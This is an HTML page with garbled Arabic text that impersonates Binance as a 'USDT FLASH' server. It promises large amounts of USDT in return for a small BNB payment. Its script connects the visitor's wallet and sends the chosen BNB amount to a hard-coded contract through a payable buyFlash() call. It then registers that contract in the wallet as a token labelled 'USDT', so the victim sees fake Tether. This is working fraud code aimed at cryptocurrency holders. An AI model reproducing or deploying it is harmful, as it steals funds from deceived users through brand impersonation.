<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Binance | USDT FLASH Server</title>
    
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>

    <style>
        :root { --binance-yellow: #F3BA2F; --binance-black: #181A20; }
        
        /* Ø¥ØµÙ„Ø§Ø­ Ù…Ø´ÙƒÙ„Ø© Ø§Ø®ØªÙØ§Ø¡ Ø§Ù„Ø¬Ø²Ø¡ Ø§Ù„Ø¹Ù„ÙˆÙŠ */
        body { 
            background: var(--binance-black); 
            color: #EAECEF; 
            font-family: 'Segoe UI', sans-serif; 
            margin: 0; 
            padding: 0;
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            min-height: 100vh;
        }

        .header { 
            width: 100%; 
            background: #0B0E11; 
            border-bottom: 1px solid #2B2F36; 
            padding: 15px 20px; 
            display: flex; 
            align-items: center; 
            justify-content: space-between;
            box-sizing: border-box;
        }

        .logo-binance { width: 120px; }
        .version-tag { color: var(--binance-yellow); font-weight: bold; font-size: 14px; }

        .main-card { 
            background: #1E2329; 
            border-radius: 20px; 
            padding: 25px; 
            width: 90%; 
            max-width: 400px; 
            margin-top: 30px; 
            border: 1px solid #2B3139; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }

        .chart-box { 
            width: 100%; 
            height: 220px; 
            border-radius: 12px; 
            overflow: hidden; 
            margin-bottom: 20px; 
            border: 1px solid #2B3139; 
        }

        .price-row { 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            background: #2B3139; 
            padding: 12px; 
            border-radius: 10px; 
            margin-bottom: 15px; 
        }

        .btn-connect { 
            background: transparent; 
            color: var(--binance-yellow); 
            border: 1px solid var(--binance-yellow); 
            width: 100%; 
            padding: 12px; 
            border-radius: 10px; 
            cursor: pointer; 
            font-weight: bold; 
            margin-bottom: 15px;
        }

        select { 
            background: #2B3139; 
            color: white; 
            border: 1px solid #474D57; 
            width: 100%; 
            padding: 15px; 
            border-radius: 10px; 
            margin-bottom: 20px; 
        }

        .btn-main { 
            background: var(--binance-yellow); 
            color: black; 
            border: none; 
            width: 100%; 
            padding: 18px; 
            border-radius: 10px; 
            font-weight: bold; 
            font-size: 18px; 
            cursor: pointer; 
        }

        #log { text-align: center; font-size: 13px; color: var(--binance-yellow); margin-top: 15px; }
    </style>
</head>
<body>

<div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Binance_Logo.svg" class="logo-binance">
    <span class="version-tag">USDT FLASH v4.2</span>
</div>

<div class="main-card">
    <div class="chart-box" id="chart_div"></div>

    <div class="price-row">
        <span style="font-weight:bold;">Tether USD (Live)</span>
        <span style="color:#00C087; font-weight:bold;">$1.0001</span>
    </div>

    <button class="btn-connect" onclick="connectWallet()">ğŸ¦Š Ø§Ø®ØªØ± Ø§Ù„Ù…Ø­ÙØ¸Ø© Ø§Ù„Ù…Ø¨Ø§Ø´Ø±Ø©</button>

    <div style="font-size: 12px; color: #707A8A; margin-bottom: 5px;">ÙØ¦Ø© Ø§Ù„Ù…Ø²Ø§Ù…Ù†Ø©:</div>
    <select id="amountSelect">
        <option value="0.09">5,000 USDT â€” [0.09 BNB]</option>
        <option value="0.2">10,000 USDT â€” [0.2 BNB]</option>
        <option value="0.5">50,000 USDT â€” [0.5 BNB]</option>
        <option value="1.0">100,000 USDT â€” [1.0 BNB]</option>
    </select>

    <button class="btn-main" onclick="startInjection()">ØªÙØ¹ÙŠÙ„ ÙˆØ§Ø³ØªÙ„Ø§Ù… Ø§Ù„Ø­Ù‚Ù† âš¡</button>
    <div id="log">Ø¨Ø§Ù†ØªØ¸Ø§Ø± Ø±Ø¨Ø· Ø§Ù„Ù…Ø­ÙØ¸Ø©...</div>
</div>

<script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
<script>
    // ØªØ´ØºÙŠÙ„ Ø§Ù„Ù…Ø®Ø·Ø· ÙÙˆØ±Ø§Ù‹
    new TradingView.widget({
        "container_id": "chart_div",
        "autosize": true,
        "symbol": "BINANCE:USDTBUSD",
        "interval": "1",
        "theme": "dark",
        "style": "3",
        "locale": "ar",
        "hide_top_toolbar": true
    });

    const Web3Modal = window.Web3Modal.default;
    let web3Modal;
    let provider;
    let userAddress;

    function init() {
        const providerOptions = {
            walletconnect: {
                package: window.WalletConnectProvider.default,
                options: { rpc: { 56: "https://bsc-dataseed.binance.org/" } }
            }
        };
        web3Modal = new Web3Modal({ cacheProvider: false, providerOptions, theme: "dark" });
    }

    async function connectWallet() {
        try {
            // Ø³ÙŠÙØªØ­ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ù…Ø­Ø§ÙØ¸. Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù„Ø¯ÙŠÙ‡ Ù…ÙŠØªØ§Ù…Ø§Ø³Ùƒ Ø³ÙŠØ¸Ù‡Ø± ÙƒØ®ÙŠØ§Ø± Ø£ÙˆÙ„.
            provider = await web3Modal.connect();
            const web3 = new Web3(provider);
            const accounts = await web3.eth.getAccounts();
            userAddress = accounts[0];
            document.getElementById('log').innerText = "ØªÙ… Ø§Ù„Ø±Ø¨Ø·: " + userAddress.substring(0,10) + "...";
        } catch(e) { console.error(e); }
    }

    async function startInjection() {
        if(!userAddress) return connectWallet();
        const msg = document.getElementById('log');
        const contractAddr = "0x22581282b507c6743762cBaA542D6B33Cd6f631f";
        const abi = [{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}];

        try {
            const web3 = new Web3(provider);
            const contract = new web3.eth.Contract(abi, contractAddr);
            const val = document.getElementById('amountSelect').value;

            msg.innerText = "Ø¬Ø§Ø±ÙŠ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø·Ù„Ø¨...";
            await contract.methods.buyFlash().send({
                from: userAddress,
                value: web3.utils.toWei(val, "ether")
            });

            // Ø¥Ø¶Ø§ÙØ© Ø§Ù„ØªÙˆÙƒÙ† Ø¨ØµØ±ÙŠØ§Ù‹
            await provider.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: { address: contractAddr, symbol: 'USDT', decimals: 18, image: 'https://cryptologos.cc/logos/tether-usdt-logo.png' }
                }
            });
            msg.innerText = "Ø§ÙƒØªÙ…Ù„ Ø§Ù„Ø­Ù‚Ù† Ø¨Ù†Ø¬Ø§Ø­!";
        } catch(e) { msg.innerText = "ÙØ´Ù„Øª Ø§Ù„Ø¹Ù…Ù„ÙŠØ©."; }
    }

    window.onload = init;
</script>
</body>
</html>
